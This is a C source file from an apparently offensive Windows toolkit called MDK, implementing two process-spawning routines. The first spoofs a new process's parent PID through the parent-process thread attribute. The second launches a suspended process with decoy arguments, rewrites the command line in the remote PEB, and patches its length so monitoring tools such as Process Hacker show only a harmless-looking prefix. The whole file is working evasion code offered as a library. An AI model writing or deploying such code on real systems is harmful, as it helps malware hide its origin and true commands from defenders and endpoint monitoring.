// MDK
// docs    : https://sebafvs.com/mdk/spawn
// author  : @sebafvs

#include <windows.h>
#include "mdk/execution.h"
#include "mdk/process.h"
#include "mdk/memory.h"
#include "mdk/thread.h"
#include "mdk/nt.h"

MDK_RESULT mdk_spawn_spoofed(IN DWORD ppid, IN LPCSTR process_name, OUT DWORD* pid, OUT HANDLE* process, OUT HANDLE* thread) {
    CHAR                        full_path[MAX_PATH * 2];
    CHAR                        windows_directory[MAX_PATH];
    SIZE_T                      attribute_list_size = 0;
    PPROC_THREAD_ATTRIBUTE_LIST attribute_list      = NULL;
    STARTUPINFOEXA              startup_info_ex     = { .StartupInfo.cb = sizeof(STARTUPINFOEXA) };
    PROCESS_INFORMATION         process_info        = { 0 };
    HANDLE                      parent       = NULL;

    MDK_RESULT result = mdk_open_process(ppid, PROCESS_ALL_ACCESS, &parent);
    if (MDK_FAIL(result)) { return result; }

    if (!GetEnvironmentVariableA("WINDIR", windows_directory, MAX_PATH)) {
        mdk_close_handle(parent);
        return MDK_MAKE_FAIL("GetEnvironmentVariableA", MDK_STATUS_UNSUCCESSFUL);
    }

    lstrcpyA(full_path, windows_directory);
    lstrcatA(full_path, "\\System32\\");
    lstrcatA(full_path, process_name);

    InitializeProcThreadAttributeList(NULL, 1, 0, &attribute_list_size);

    attribute_list = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attribute_list_size);
    if (!attribute_list) {
        mdk_close_handle(parent);
        return MDK_MAKE_FAIL("HeapAlloc", MDK_STATUS_NO_MEMORY);
    }

    if (!InitializeProcThreadAttributeList(attribute_list, 1, 0, &attribute_list_size) ||
        !UpdateProcThreadAttribute(attribute_list, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            &parent, sizeof(HANDLE), NULL, NULL)) {
        HeapFree(GetProcessHeap(), 0, attribute_list);
        mdk_close_handle(parent);
        return MDK_MAKE_FAIL("InitializeProcThreadAttributeList", MDK_STATUS_UNSUCCESSFUL);
    }

    startup_info_ex.lpAttributeList = attribute_list;

    BOOL process_created = CreateProcessA(
        NULL, full_path, NULL, NULL, FALSE,
        EXTENDED_STARTUPINFO_PRESENT, NULL, NULL,
        &startup_info_ex.StartupInfo, &process_info
    );

    DeleteProcThreadAttributeList(attribute_list);
    HeapFree(GetProcessHeap(), 0, attribute_list);
    mdk_close_handle(parent);

    if (!process_created) { return MDK_MAKE_FAIL("CreateProcessA", MDK_STATUS_UNSUCCESSFUL); }

    if (pid)      { *pid      = process_info.dwProcessId; }
    if (process)  { *process  = process_info.hProcess;    }
    if (thread)   { *thread   = process_info.hThread;     }

    return MDK_MAKE_OK();
}

MDK_RESULT mdk_spawn_arg_spoofed(IN LPCWSTR startup_args, IN LPCWSTR real_args, IN USHORT visible_length, OUT DWORD* pid, OUT HANDLE* process, OUT HANDLE* thread) {
    // real_args must fit inside the dummy string's allocation, caller's responsibility.
    WCHAR               command_line[MAX_PATH * 2];
    WCHAR               windows_directory[MAX_PATH];
    WCHAR               working_directory[MAX_PATH];
    STARTUPINFOW        startup_info    = { .cb = sizeof(STARTUPINFOW) };
    PROCESS_INFORMATION process_info   = { 0 };
    BOOL                process_spawned = FALSE;

    if (!GetEnvironmentVariableW(L"WINDIR", windows_directory, MAX_PATH)) {
        return MDK_MAKE_FAIL("GetEnvironmentVariableW", MDK_STATUS_UNSUCCESSFUL);
    }

    lstrcpyW(working_directory, windows_directory);
    lstrcatW(working_directory, L"\\System32");

    // CreateProcessW requires a mutable buffer for the command line.
    lstrcpyW(command_line, startup_args);

    BOOL created = CreateProcessW(
        NULL, command_line,
        NULL, NULL, FALSE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW,
        NULL, working_directory,
        &startup_info, &process_info
    );

    if (!created) { return MDK_MAKE_FAIL("CreateProcessW", MDK_STATUS_UNSUCCESSFUL); }
    process_spawned = TRUE;

    // Read the remote PEB to get the ProcessParameters pointer.
    MDK_PEB    peb    = { 0 };
    MDK_RESULT result = mdk_read_peb(process_info.hProcess, &peb);
    if (MDK_FAIL(result)) { goto _cleanup; }

    DWORD                params_read_size = sizeof(MDK_RTL_PROC_PARAMS) + 0xFF;
    MDK_RTL_PROC_PARAMS* process_params   = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, params_read_size);
    if (!process_params) {
        result = MDK_MAKE_FAIL("HeapAlloc", MDK_STATUS_NO_MEMORY);
        goto _cleanup;
    }

    result = mdk_read(process_info.hProcess, peb.ProcessParameters, process_params, params_read_size);
    if (MDK_FAIL(result)) {
        HeapFree(GetProcessHeap(), 0, process_params);
        goto _cleanup;
    }

    // Overwrite CommandLine.Buffer with the real argument.
    DWORD write_size = (DWORD)(lstrlenW(real_args) * sizeof(WCHAR) + sizeof(WCHAR));
    result = mdk_write(process_info.hProcess, (PVOID)process_params->CommandLine.Buffer, (PVOID)real_args, write_size);

    if (MDK_OK(result) && visible_length > 0) {
        // Patch CommandLine.Length so tools like Process Hacker read only the visible prefix.
        PVOID remote_length_address = (PBYTE)peb.ProcessParameters +
                                      offsetof(MDK_RTL_PROC_PARAMS, CommandLine) +
                                      offsetof(MDK_USTR, Length);
        result = mdk_write(process_info.hProcess, remote_length_address, &visible_length, sizeof(USHORT));
    }

    HeapFree(GetProcessHeap(), 0, process_params);
    if (MDK_FAIL(result)) { goto _cleanup; }

    result = mdk_resume_thread(process_info.hThread);
    if (MDK_FAIL(result)) { goto _cleanup; }

    process_spawned = FALSE;

    if (pid)      { *pid      = process_info.dwProcessId; }
    if (process)  { *process  = process_info.hProcess;    }
    if (thread)   { *thread   = process_info.hThread;     }

    return MDK_MAKE_OK();

_cleanup:
    if (process_spawned) {
        TerminateProcess(process_info.hProcess, 0);
        CloseHandle(process_info.hProcess);
        CloseHandle(process_info.hThread);
    }
    return result;
}
